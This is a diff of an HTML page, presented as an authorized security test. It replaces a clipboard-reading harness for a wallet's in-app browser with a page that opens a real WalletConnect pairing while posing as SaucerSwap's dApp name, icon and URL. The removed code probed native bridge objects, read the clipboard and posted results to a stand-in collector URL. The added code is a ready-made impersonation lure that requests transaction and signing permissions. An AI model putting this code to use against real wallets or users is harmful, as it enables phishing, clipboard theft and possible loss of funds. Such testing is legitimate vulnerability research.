@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>In-App Browser Clipboard Access Test (Authorized Security Test)</title>
+<title>WalletConnect Metadata / Verify-API Test (Authorized Security Test)</title>
 <style>
   body { font-family: -apple-system, Roboto, sans-serif; background:#111; color:#eee; padding:16px; line-height:1.4; }
   h1 { font-size:18px; }
@@ -11,97 +11,87 @@
   button { display:block; width:100%; padding:14px; margin:8px 0; font-size:15px; border:0; border-radius:8px; background:#2d6cdf; color:#fff; }
   button:active { background:#1e4fae; }
   button.danger { background:#c33; }
-  button.ghost { background:#333; }
+  button:disabled { background:#333; color:#888; }
   pre { background:#000; color:#0f0; padding:10px; border-radius:6px; white-space:pre-wrap; word-break:break-all; font-size:12px; max-height:280px; overflow:auto; }
   .warn { color:#f66; font-size:12px; }
   .ok { color:#6f6; }
   .bad { color:#f66; }
   .info { color:#9cf; }
   .note { color:#fc6; font-size:12px; }
-  input[type=text] { width:100%; padding:10px; margin:6px 0; box-sizing:border-box; background:#222; color:#eee; border:1px solid #444; border-radius:6px; }
-  .row { display:flex; gap:8px; }
-  .row button { flex:1; }
+  label { font-size:13px; color:#ccc; }
+  input[type=text] { width:100%; padding:10px; margin:6px 0 12px; box-sizing:border-box; background:#222; color:#eee; border:1px solid #444; border-radius:6px; }
+  #qr { background:#fff; padding:16px; border-radius:8px; display:flex; justify-content:center; margin:12px 0; min-height:220px; align-items:center; }
+  #qr img, #qr canvas { max-width:100%; }
 </style>
 </head>
 <body>
 
-<h1>Clipboard Access Test Harness</h1>
+<h1>WalletConnect Metadata Spoof / Verify-API Test</h1>
 <p class="warn">
-  Authorized security test only. This page attempts several methods a malicious
-  page could use to read the device clipboard silently from inside a wallet's
-  in-app browser. Nothing here is sent anywhere by default &mdash; exfiltration
-  is opt-in via the "Collector URL" field below, for your own controlled endpoint.
+  Authorized security test only. This page starts a real WalletConnect v2 pairing
+  session, but reports its own dApp metadata (name/icon/url) as whatever you set
+  below &mdash; independent of the domain actually hosting this page. Purpose:
+  see whether the wallet's approval screen shows the real connecting origin /
+  a Verify API mismatch warning, or blindly trusts and displays the self-reported
+  metadata. Nothing here signs or moves funds &mdash; it only observes what the
+  wallet displays at the pairing/approval step. Do not approve the session unless
+  you intend to test the approval flow itself.
 </p>
 
-<h2>1. Setup</h2>
-<label>Collector URL (optional &mdash; your own logging endpoint, leave blank for on-device only):</label>
-<input type="text" id="collectorUrl" placeholder="https://your-collector.example/log" value="" />
-<label>Marker string &mdash; copy this to the clipboard manually before testing:</label>
-<input type="text" id="marker" value="SAUCERSWAP-CLIP-TEST-1234" readonly onclick="this.select()" />
+<h2>1. WalletConnect Project ID</h2>
+<label>Your own WalletConnect Cloud project ID (required by the SDK to open a relay session &mdash; get one free at cloud.walletconnect.com, this does not need to belong to the spoofed brand):</label>
+<input type="text" id="projectId" placeholder="e.g. 3fbb...c2a1" value="" />
 
-<h2>2. Native bridge probe</h2>
-<button onclick="probeBridge()">Probe window.ReactNativeWebView / injected objects</button>
+<h2>2. Spoofed dApp metadata</h2>
+<label>Name (what the wallet will display):</label>
+<input type="text" id="metaName" value="SaucerSwap" />
+<label>Icon URL (what the wallet will render as the dApp's icon):</label>
+<input type="text" id="metaIcon" value="https://www.saucerswap.finance/icons/icon-128x128.png" />
+<label>Claimed URL (self-reported &mdash; this is the metadata.url field the SDK sends, NOT where this page is actually hosted):</label>
+<input type="text" id="metaUrl" value="https://www.saucerswap.finance" />
+<label>Description:</label>
+<input type="text" id="metaDesc" value="SaucerSwap - The DEX for Hedera" />
 
-<h2>3. Clipboard read attempts</h2>
-<div class="row">
-  <button onclick="tryAsyncClipboard()">navigator.clipboard.readText()</button>
-</div>
-<p class="note">execCommand('paste') button removed &mdash; Chromium disables interactive execCommand paste unconditionally since ~M89, so this vector returns false/no-event in every modern WebView regardless of host app. It was testing the browser engine, not SaucerSwap. Kept the log line format for reference if you re-add it against an older engine.</p>
-<div class="row">
-  <button onclick="armPassiveListener()">Arm passive paste listener (then manually paste the marker)</button>
-</div>
-<div class="row">
-  <button onclick="tryClipboardPermissionsQuery()">navigator.permissions.query(clipboard-read)</button>
-</div>
+<p class="note">
+  Note the actual page origin this script runs from (shown in "env" log below) will
+  differ from the Claimed URL above &mdash; that mismatch is exactly what the
+  Verify API is supposed to catch and flag to the wallet UI. If it doesn't, that's
+  your finding.
+</p>
 
-<button class="ghost" onclick="runAll()">Run All Tests In Sequence</button>
-<button class="danger" onclick="clearLog()">Clear Results</button>
+<button id="startBtn" onclick="startPairing()">Generate Pairing QR</button>
+<button class="danger" onclick="clearLog()">Clear Log</button>
 
-<h2>4. Passive listener (auto-fires, no button)</h2>
-<p>A hidden focused contenteditable that logs any paste event that reaches it. <b>This only fires on a real paste gesture</b> &mdash; it cannot self-trigger. Tap "Arm passive paste listener" above, then long-press &rarr; Paste (or Ctrl+V) anywhere on screen within 10s. If content shows up in the log without you explicitly pasting into a visible field, that's the finding.</p>
-<div id="pasteTarget" contenteditable="true" style="position:absolute; left:-9999px; width:1px; height:1px;"></div>
+<h2>3. QR to scan in SaucerSwap wallet</h2>
+<div id="qr"><span style="color:#999">QR will appear here after you tap Generate</span></div>
 
-<h2>Results</h2>
+<h2>Log</h2>
 <pre id="out"></pre>
 
+<script src="https://unpkg.com/@walletconnect/sign-client@2/dist/index.umd.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
 <script>
 const out = document.getElementById('out');
 
 function fmtTag(label) {
-  if (/SUCCESS|fired|granted/i.test(label)) return 'ok';
-  if (/blocked|error|denied|threw|not present|timeout/i.test(label)) return 'bad';
+  if (/SUCCESS|approved|connected/i.test(label)) return 'ok';
+  if (/error|rejected|EXCEPTION|denied/i.test(label)) return 'bad';
   return 'info';
 }
 
 function log(label, data) {
   const time = new Date().toISOString();
-  const text = typeof data === 'string' ? data : JSON.stringify(data);
+  const text = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
   const div = document.createElement('div');
   div.className = fmtTag(label);
   div.textContent = `[${time}] ${label}: ${text}`;
   out.appendChild(div);
   out.scrollTop = out.scrollHeight;
-  maybeExfiltrate(label, data);
 }
 
 function clearLog() {
   out.textContent = '';
   log('log-cleared', 'ready');
-}
-
-function maybeExfiltrate(label, data) {
-  const url = document.getElementById('collectorUrl').value.trim();
-  if (!url) return;
-  try {
-    fetch(url, {
-      method: 'POST',
-      mode: 'no-cors',
-      headers: { 'Content-Type': 'text/plain' },
-      body: JSON.stringify({ label, data, ua: navigator.userAgent, ts: Date.now() })
-    }).catch(e => log('exfil-error', String(e)));
-  } catch (e) {
-    log('exfil-error', String(e));
-  }
 }
 
 window.addEventListener('error', (ev) => {
@@ -111,108 +101,75 @@ window.addEventListener('unhandledrejection', (ev) => {
   log('UNHANDLED-PROMISE-REJECTION', String(ev.reason));
 });
 
-// --- 2. Native bridge probe ---
-function probeBridge() {
-  log('bridge-probe-invoked', 'starting');
+let signClient = null;
+
+async function startPairing() {
+  const projectId = document.getElementById('projectId').value.trim();
+  if (!projectId) {
+    log('config-error', 'Enter a WalletConnect Cloud project ID first (cloud.walletconnect.com — free, takes a minute).');
+    return;
+  }
+  const meta = {
+    name: document.getElementById('metaName').value.trim(),
+    description: document.getElementById('metaDesc').value.trim(),
+    url: document.getElementById('metaUrl').value.trim(),
+    icons: [document.getElementById('metaIcon').value.trim()]
+  };
+  log('spoofed-metadata', meta);
+  log('actual-page-origin', window.location.origin);
+
+  document.getElementById('startBtn').disabled = true;
   try {
-    const found = {};
-    ['ReactNativeWebView', 'saucerswapWallet', 'hashpack', 'ReactNativeClipboard', 'Clipboard'].forEach(k => {
-      if (typeof window[k] === 'undefined') {
-        found[k] = 'not present';
-        return;
-      }
-      const own = Object.getOwnPropertyNames(window[k]);
-      const proto = Object.getPrototypeOf(window[k]);
-      const protoNames = proto ? Object.getOwnPropertyNames(proto) : [];
-      found[k] = [...new Set(own.concat(protoNames))];
+    log('sign-client-init', 'starting');
+    signClient = await window.SignClient.init({
+      projectId,
+      metadata: meta
     });
-    const clipboardish = Object.getOwnPropertyNames(window).filter(k => /clip|paste/i.test(k));
-    found['window keys matching /clip|paste/i'] = clipboardish;
-    log('bridge-probe-result', found);
+    log('sign-client-init-SUCCESS', 'ready');
+
+    signClient.on('session_proposal', (ev) => log('session_proposal-event', ev));
+    signClient.on('session_event', (ev) => log('session_event', ev));
+    signClient.on('session_update', (ev) => log('session_update', ev));
+    signClient.on('session_delete', (ev) => log('session_delete', ev));
+
+    log('connect-invoked', 'requesting pairing URI (Hedera-relevant namespace requested generically; adjust chains if your target expects a specific one)');
+    const { uri, approval } = await signClient.connect({
+      requiredNamespaces: {
+        eip155: {
+          methods: ['eth_sendTransaction', 'personal_sign', 'eth_signTypedData'],
+          chains: ['eip155:1'],
+          events: ['chainChanged', 'accountsChanged']
+        }
+      }
+    });
+
+    if (uri) {
+      log('pairing-uri-generated', uri);
+      const qrDiv = document.getElementById('qr');
+      qrDiv.innerHTML = '';
+      new QRCode(qrDiv, { text: uri, width: 240, height: 240 });
+      log('instruction', 'Scan this QR in SaucerSwap wallet: Connected Apps > Scan QR Code. Observe the approval screen BEFORE tapping approve — does it show the real origin, a verify warning, or just the spoofed name/icon?');
+    }
+
+    approval().then((session) => {
+      log('session-APPROVED', session);
+    }).catch((e) => {
+      log('session-rejected-or-error', String(e));
+    });
+
   } catch (e) {
-    log('bridge-probe-EXCEPTION', String(e));
+    log('pairing-EXCEPTION', String(e));
+  } finally {
+    document.getElementById('startBtn').disabled = false;
   }
-}
-
-// --- 3a. Standard async Clipboard API ---
-// FIX: must be called with fresh user-activation, i.e. as the very first
-// awaited thing in a click handler, with no prior await/setTimeout consuming
-// the activation window. Calling this button directly already satisfies that.
-async function tryAsyncClipboard() {
-  log('async-clipboard-invoked', 'starting');
-  if (!navigator.clipboard || !navigator.clipboard.readText) {
-    log('async-clipboard-unavailable', 'API not present on navigator.clipboard');
-    return;
-  }
-  try {
-    const text = await navigator.clipboard.readText();
-    log('async-clipboard-SUCCESS', text);
-  } catch (e) {
-    log('async-clipboard-blocked', String(e));
-  }
-}
-
-// --- 3b. Passive listener, now with explicit arm + timeout so a "no result"
-// outcome is logged instead of just silently doing nothing. ---
-let passiveTimer = null;
-
-function armPassiveListener() {
-  const target = document.getElementById('pasteTarget');
-  target.textContent = '';
-  target.focus();
-  log('paste-listener-armed', 'Focused hidden field. Manually paste (long-press > Paste, or Ctrl+V) anywhere within 10s.');
-  if (passiveTimer) clearTimeout(passiveTimer);
-  passiveTimer = setTimeout(() => {
-    log('paste-listener-timeout', 'No paste event received in 10s window (expected unless you performed a manual paste)');
-  }, 10000);
-}
-
-document.getElementById('pasteTarget').addEventListener('paste', (ev) => {
-  if (passiveTimer) { clearTimeout(passiveTimer); passiveTimer = null; }
-  let text = '(unavailable)';
-  try { text = (ev.clipboardData || window.clipboardData).getData('text'); } catch (e) {}
-  log('PASSIVE-paste-event-fired-SUCCESS', text);
-});
-
-// --- 3c. Permissions API introspection ---
-async function tryClipboardPermissionsQuery() {
-  log('permissions-query-invoked', 'starting');
-  if (!navigator.permissions || !navigator.permissions.query) {
-    log('permissions-query-unavailable', 'navigator.permissions not present');
-    return;
-  }
-  try {
-    const status = await navigator.permissions.query({ name: 'clipboard-read' });
-    log('permissions-query-clipboard-read', status.state);
-    status.onchange = () => log('permissions-query-clipboard-read-CHANGED', status.state);
-  } catch (e) {
-    log('permissions-query-error', String(e));
-  }
-}
-
-// --- Run everything in order. FIX: async clipboard read now goes FIRST,
-// synchronously off the click with no preceding await, so it still carries
-// the click's transient user-activation. Everything after it can have gaps
-// since only the clipboard-read call needs fresh activation. ---
-async function runAll() {
-  log('run-all-started', '---');
-  await tryAsyncClipboard();
-  probeBridge();
-  await new Promise(r => setTimeout(r, 400));
-  await tryClipboardPermissionsQuery();
-  await new Promise(r => setTimeout(r, 400));
-  armPassiveListener();
-  log('run-all-note', 'Passive listener armed for 10s — manually paste now if testing that vector.');
 }
 
 window.addEventListener('load', () => {
   log('env', {
-    ua: navigator.userAgent,
-    isSecureContext: window.isSecureContext,
-    hasClipboardObj: !!navigator.clipboard,
-    hasExecCommand: !!document.execCommand
+    origin: window.location.origin,
+    ua: navigator.userAgent
   });
-  log('ready', 'Tap buttons individually for clean activation, or Run All (clipboard read still fires first/fresh).');
+  log('ready', 'Fill in project ID + spoofed metadata, then tap Generate Pairing QR.');
 });
 </script>
 
